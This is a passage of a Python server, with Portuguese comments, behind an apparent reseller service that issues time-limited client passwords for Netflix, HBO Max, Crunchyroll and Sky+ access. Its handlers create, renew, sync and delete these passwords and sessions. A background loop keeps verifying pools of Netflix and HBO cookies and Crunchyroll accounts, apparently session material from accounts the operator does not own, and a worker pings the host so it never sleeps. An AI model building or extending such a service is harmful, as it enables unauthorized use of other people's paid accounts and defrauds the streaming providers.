            f"🔗 *Acessar Sistema:* {site_url}\n\n"
            f"_Basta abrir o link no celular ou computador e digitar o código que aparece na sua Smart TV!_"
        )

        global SERVER_DATA_VERSION
        SERVER_DATA_VERSION = time.time()

        # Suporte a auto-login imediato (Criar e já entrar no site na hora)
        new_token = None
        if req.get("auto_login") or req.get("login_now"):
            new_token = secrets.token_hex(32)
            with LOGIN_LOCK:
                ACTIVE_SESSIONS[new_token] = {
                    "exp": time.time() + TOKEN_TTL_SECONDS,
                    "services": servicos,
                    "role_name": nome,
                    "password": new_pwd,
                    "expires_at": expira_em,
                    "days_remaining": dias if dias > 0 else None,
                    "expiration_date": expira_formatado
                }
                save_active_sessions()
            track_client_heartbeat(self.get_client_ip(), new_token, self.headers.get('User-Agent', ''), nome, servicos[0] if servicos else "netflix")

        res_payload = {
            "success": True,
            "password": new_pwd,
            "role_name": nome,
            "services": servicos,
            "plan_label": plan_label,
            "dias_validade": dias,
            "expira_em": expira_em,
            "expira_em_formatado": expira_formatado,
            "validade_label": validade_label,
            "whatsapp_message": whatsapp_msg,
            "passwords": keys,
            "message": f"🎉 Senha '{new_pwd}' gerada com validade de {validade_label}!"
        }
        if new_token:
            res_payload["token"] = new_token
            res_payload["allowed_services"] = servicos
            res_payload["expires_in"] = TOKEN_TTL_SECONDS

        return self.send_json_response(res_payload)

    def handle_api_save_password(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        try:
            req = json.loads(post_data.decode('utf-8')) if post_data else {}
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido."}, 400)

        senha = str(req.get("senha", "") or req.get("password", "") or "").strip()
        nome = str(req.get("nome", "") or req.get("role_name", "") or req.get("cliente", "") or "").strip()
        servicos = req.get("servicos", []) or req.get("allowed_services", [])
        descricao = str(req.get("descricao", "") or req.get("description", "") or "").strip()

        # Se o usuário preencheu apenas o telefone/nome do cliente e deixou a senha vazia, usa o próprio telefone como senha!
        if not senha and nome:
            senha = nome

        if not senha:
            return self.send_json_response({"success": False, "message": "A senha não pode estar em branco. Digite uma senha ou o telefone do cliente."}, 400)

        # Normalização inteligente e flexível dos serviços selecionados
        valid_services = []
        if isinstance(servicos, list) and len(servicos) > 0:
            for s in servicos:
                s_clean = str(s).strip().lower()
                if s_clean in ["netflix", "nf"]:
                    if "netflix" not in valid_services: valid_services.append("netflix")
                elif s_clean in ["hbo", "hbomax", "hbo_max", "max"]:
                    if "hbo" not in valid_services: valid_services.append("hbo")
                elif s_clean in ["crunchyroll", "crunchy", "cr"]:
                    if "crunchyroll" not in valid_services: valid_services.append("crunchyroll")
                elif s_clean in ["sky", "sky+", "sky_tv", "skytv"]:
                    if "sky" not in valid_services: valid_services.append("sky")

        # Se nenhum serviço válido foi identificado, libera todos os 4 por segurança
        if not valid_services:
            valid_services = ["netflix", "hbo", "crunchyroll", "sky"]

        if not nome:
            svc_names = [s.upper() for s in valid_services]
            nome = f"Perfil {' + '.join(svc_names)}"

        # ⏱️ Validade e Duração
        dias_val = req.get("dias") if req.get("dias") is not None else req.get("duration_days", req.get("dias_validade"))
        try:
            dias = int(dias_val) if dias_val is not None else 30
        except Exception:
            dias = 30

        now = time.time()
        if dias > 0:
            expira_em = now + (dias * 86400)
            expira_formatado = datetime.fromtimestamp(expira_em).strftime('%d/%m/%Y às %H:%M')
        else:
            expira_em = None
            expira_formatado = None

        with SENHAS_LOCK:
            keys = load_access_keys()
            found = False
            for idx, k in enumerate(keys):
                k_pwd = str(k.get("senha", "")).strip()
                if secure_str_compare(k_pwd, senha):
                    keys[idx] = {
                        "senha": senha,
                        "nome": nome,
                        "servicos": valid_services,
                        "descricao": descricao or f"Libera: {', '.join(valid_services)}",
                        "dias_validade": dias,
                        "criado_em": k.get("criado_em", now),
                        "expira_em": expira_em,
                        "expira_em_formatado": expira_formatado
                    }
                    found = True
                    break
            
            if not found:
                keys.insert(0, {
                    "senha": senha,
                    "nome": nome,
                    "servicos": valid_services,
                    "descricao": descricao or f"Libera: {', '.join(valid_services)}",
                    "dias_validade": dias,
                    "criado_em": now,
                    "expira_em": expira_em,
                    "expira_em_formatado": expira_formatado
                })

            atomic_save_config_senhas(keys)
            remove_blacklisted_password(senha)

            # Atualiza dinamicamente as permissões em sessões ativas com esta senha
            with LOGIN_LOCK:
                for tok, s_info in ACTIVE_SESSIONS.items():
                    tok_pwd = str(s_info.get("password", "")).strip()
                    if secure_str_compare(tok_pwd, senha) or tok_pwd == senha:
                        s_info["services"] = valid_services
                        s_info["role_name"] = nome
                        s_info["expires_at"] = expira_em
                        s_info["days_remaining"] = dias if dias > 0 else None
                        s_info["expiration_date"] = expira_formatado
                save_active_sessions()

        global SERVER_DATA_VERSION
        SERVER_DATA_VERSION = time.time()

        # Suporte a auto-login imediato ao salvar
        new_token = None
        if req.get("auto_login") or req.get("login_now"):
            new_token = secrets.token_hex(32)
            with LOGIN_LOCK:
                ACTIVE_SESSIONS[new_token] = {
                    "exp": time.time() + TOKEN_TTL_SECONDS,
                    "services": valid_services,
                    "role_name": nome,
                    "password": senha,
                    "expires_at": expira_em,
                    "days_remaining": dias if dias > 0 else None,
                    "expiration_date": expira_formatado
                }
                save_active_sessions()
            track_client_heartbeat(self.get_client_ip(), new_token, self.headers.get('User-Agent', ''), nome, valid_services[0] if valid_services else "netflix")

        res_payload = {
            "success": True,
            "message": f"Senha de '{nome}' salva com validade de {dias} dias!",
            "passwords": keys
        }
        if new_token:
            res_payload["token"] = new_token
            res_payload["allowed_services"] = valid_services
            res_payload["role_name"] = nome
            res_payload["password"] = senha
            res_payload["expires_in"] = TOKEN_TTL_SECONDS

        return self.send_json_response(res_payload)

    def handle_api_renew_password(self):
        """Renova ou adiciona dias de validade a uma senha existente com 1 clique."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) if content_length > 0 else b'{}'
        try:
            req = json.loads(post_data.decode('utf-8')) if post_data else {}
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido."}, 400)

        target_pwd = str(req.get("senha", "") or req.get("password", "")).strip()
        add_days_val = req.get("add_days") if req.get("add_days") is not None else req.get("dias", 30)
        try:
            add_days = int(add_days_val)
        except Exception:
            add_days = 30

        if not target_pwd:
            return self.send_json_response({"success": False, "message": "Senha não informada."}, 400)

        now = time.time()
        updated = False
        with SENHAS_LOCK:
            keys = load_access_keys()
            for item in keys:
                if secure_str_compare(item.get("senha", ""), target_pwd):
                    curr_exp = item.get("expira_em")
                    if not curr_exp or curr_exp < now:
                        new_exp = now + (add_days * 86400)
                    else:
                        new_exp = curr_exp + (add_days * 86400)
                    item["expira_em"] = new_exp
                    item["expira_em_formatado"] = datetime.fromtimestamp(new_exp).strftime('%d/%m/%Y às %H:%M')
                    item["dias_validade"] = (item.get("dias_validade") or 0) + add_days
                    updated = True
                    break
            if updated:
                atomic_save_config_senhas(keys)
                global SERVER_DATA_VERSION
                SERVER_DATA_VERSION = time.time()
                return self.send_json_response({
                    "success": True,
                    "message": f"🎉 Senha renovada com sucesso! +{add_days} dias adicionados.",
                    "passwords": keys
                })
        return self.send_json_response({"success": False, "message": "Senha não encontrada no cadastro."}, 404)

    def handle_api_backup_passwords(self):
        """Permite download direto do arquivo de backup de senhas."""
        with SENHAS_LOCK:
            keys = load_access_keys()
        payload = json.dumps({"senhas": keys}, indent=2, ensure_ascii=False).encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.send_header('Content-Disposition', 'attachment; filename="config_senhas.json"')
        self.send_header('Content-Length', str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def handle_api_sync_all_passwords(self):
        """Sincroniza um lote completo de senhas (ex: restaurando do localStorage ou arquivo importado) sem perdas."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) if content_length > 0 else b'{}'
        try:
            req = json.loads(post_data.decode('utf-8')) if post_data else {}
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido."}, 400)

        incoming_list = []
        if isinstance(req, list):
            incoming_list = req
        elif isinstance(req, dict):
            incoming_list = req.get("senhas", req.get("passwords", []))

        if not isinstance(incoming_list, list) or not incoming_list:
            return self.send_json_response({"success": False, "message": "Nenhuma senha fornecida para sincronização."}, 400)

        now = time.time()
        blacklisted = load_blacklisted_passwords()

        with SENHAS_LOCK:
            current_keys = load_access_keys()
            merged_dict = {}
            for k in current_keys:
                p = str(k.get("senha", "")).strip()
                if p:
                    merged_dict[p] = k

            added_count = 0
            for item in incoming_list:
                if not isinstance(item, dict):
                    continue
                pwd = str(item.get("senha", "") or item.get("password", "")).strip()
                if not pwd:
                    continue
                if any(secure_str_compare(pwd, b) for b in blacklisted):
                    continue

                nome = str(item.get("nome", "") or item.get("role_name", "") or "Cliente VIP").strip()
                raw_svcs = item.get("servicos", ["netflix", "hbo", "crunchyroll", "sky"])
                if isinstance(raw_svcs, str):
                    raw_svcs = [s.strip() for s in raw_svcs.split(",") if s.strip()]
                elif not isinstance(raw_svcs, list):
                    raw_svcs = ["netflix", "hbo", "crunchyroll", "sky"]
                svcs = [s for s in raw_svcs if s in ["netflix", "hbo", "crunchyroll", "sky"]]
                desc = str(item.get("descricao", "")).strip()

                if pwd not in merged_dict:
                    merged_dict[pwd] = {
                        "senha": pwd,
                        "nome": nome or "Cliente VIP",
                        "servicos": svcs or ["netflix", "hbo", "crunchyroll", "sky"],
                        "descricao": desc or f"Libera: {', '.join(svcs)}",
                        "dias_validade": item.get("dias_validade"),
                        "criado_em": item.get("criado_em", now),
                        "expira_em": item.get("expira_em"),
                        "expira_em_formatado": item.get("expira_em_formatado")
                    }
                    added_count += 1
                else:
                    existing = merged_dict[pwd]
                    if item.get("expira_em") and not existing.get("expira_em"):
                        existing["expira_em"] = item.get("expira_em")
                        existing["expira_em_formatado"] = item.get("expira_em_formatado")
                        existing["dias_validade"] = item.get("dias_validade")
                    if item.get("nome") and existing.get("nome") in ["Cliente VIP", "Perfil"]:
                        existing["nome"] = item.get("nome")

            final_keys = list(merged_dict.values())
            atomic_save_config_senhas(final_keys)

            global SERVER_DATA_VERSION
            SERVER_DATA_VERSION = time.time()

        return self.send_json_response({
            "success": True,
            "message": f"🎉 {len(final_keys)} senhas sincronizadas com sucesso (+{added_count} novas adicionadas)!",
            "total": len(final_keys),
            "passwords": final_keys
        })

    def handle_api_delete_password(self):
        global SERVER_DATA_VERSION
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        try:
            req = json.loads(post_data.decode('utf-8')) if post_data else {}
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido."}, 400)

        senha = str(req.get("senha", "") or req.get("password", "")).strip()
        nome = str(req.get("nome", "") or req.get("role_name", "")).strip()
        raw_idx = req.get("index")

        with SENHAS_LOCK:
            keys = load_access_keys()
            target_idx = -1
            target_item = None

            # 1. Prioridade máxima: busca pela string exata da senha
            if senha:
                for idx, k in enumerate(keys):
                    k_pwd = str(k.get("senha", "")).strip()
                    if secure_str_compare(k_pwd, senha) or k_pwd == senha or k_pwd.lower() == senha.lower():
                        target_idx = idx
                        target_item = k
                        break

            # 2. Se não encontrou por senha, busca pelo nome do cliente/perfil
            if target_idx == -1 and nome:
                for idx, k in enumerate(keys):
                    k_name = str(k.get("nome", "")).strip()
                    if secure_str_compare(k_name, nome) or k_name.lower() == nome.lower():
                        target_idx = idx
                        target_item = k
                        break

            # 3. Se não encontrou por senha nem nome, tenta pelo índice da lista
            if target_idx == -1 and raw_idx is not None:
                try:
                    idx = int(raw_idx)
                    if 0 <= idx < len(keys):
                        target_idx = idx
                        target_item = keys[idx]
                except Exception:
                    pass

            if target_idx == -1 or target_item is None:
                return self.send_json_response({"success": False, "message": "Senha não encontrada no sistema para exclusão."}, 404)

            deleted_pwd = str(target_item.get("senha", "")).strip()
            deleted_name = str(target_item.get("nome", "Perfil")).strip()
            keys.pop(target_idx)

            # Salva no arquivo e adiciona à lista negra permanente
            atomic_save_config_senhas(keys)
            add_blacklisted_password(deleted_pwd)

            # Invalida e desconecta imediatamente qualquer usuário ou celular que estava usando esta senha
            admin_tok = self.get_auth_token_str()
            with LOGIN_LOCK:
                if admin_tok:
                    ACTIVE_ADMIN_SESSIONS[admin_tok] = time.time() + 86400 * 30
                to_purge = [
                    t for t, s in ACTIVE_SESSIONS.items()
                    if t != admin_tok and (
                        secure_str_compare(str(s.get("password", "")).strip(), deleted_pwd) or
                        secure_str_compare(str(s.get("role_name", "")).strip(), deleted_name)
                    )
                ]
                for t in to_purge:
                    ACTIVE_SESSIONS.pop(t, None)
                save_active_sessions()

            # Limpa dos usuários online ao vivo
            with ONLINE_USERS_LOCK:
                to_purge_hb = [
                    k for k, v in ACTIVE_CLIENT_HEARTBEATS.items()
                    if secure_str_compare(v.get("role_name", ""), deleted_name)
                ]
                for k in to_purge_hb:
                    ACTIVE_CLIENT_HEARTBEATS.pop(k, None)

            SERVER_DATA_VERSION = time.time()
            return self.send_json_response({
                "success": True,
                "message": f"Senha '{deleted_name}' removida permanentemente. Dispositivos desconectados ao vivo!",
                "passwords": keys
            })


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    daemon_threads = True
    allow_reuse_address = True

def background_verifier_loop():
    while True:
        try:
            get_verified_netflix_cookies(min_count=8)
            get_verified_hbo_cookies(min_count=4)
            get_verified_crunchyroll_accounts(min_count=2)
            get_all_sky_accounts()
        except Exception:
            pass
        time.sleep(12)

def keep_alive_worker():
    """Anti-Sleep 24h: Mantém a instância do Render 100% acordada e instantânea."""
    time.sleep(15) # Espera o servidor iniciar
    while True:
        try:
            # 1. Ping interno local
            requests.get(f"http://127.0.0.1:{PORT}/api/ping", timeout=4)
        except Exception:
            pass

        try:
            # 2. Ping externo se estiver na nuvem Render
            render_url = os.environ.get("RENDER_EXTERNAL_URL", "https://tvcodigo-1.onrender.com")
            if render_url:
                target = f"{render_url.rstrip('/')}/api/ping"
                requests.get(target, timeout=8)
        except Exception:
            pass

        time.sleep(300) # Ping a cada 5 minutos

def start_background_scanner():
    t1 = threading.Thread(target=background_verifier_loop, daemon=True)
    t1.start()
    t2 = threading.Thread(target=keep_alive_worker, daemon=True)
    t2.start()

def run_server(port=PORT):
    os.chdir(BASE_DIR)
    local_ip = get_local_ip()
    start_background_scanner()
    with ThreadedTCPServer(("", port), AppRequestHandler) as httpd:
        print(f"\n=======================================================")
        print(f" 🚀 ATIVADOR NETFLIX, HBO MAX, CRUNCHYROLL & SKY+ INICIADO COM SUCESSO!")
        print(f" ⚡ Anti-Sleep 24h: ATIVADO (Render sempre acordado)")
        print(f" 💻 Acesse no PC:      http://localhost:{port}")
        print(f" 📱 Acesse no Celular: http://{local_ip}:{port}  (no mesmo Wi-Fi)")
        print(f"=======================================================\n")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nServidor finalizado pelo usuário.")

if __name__ == "__main__":
    run_server()
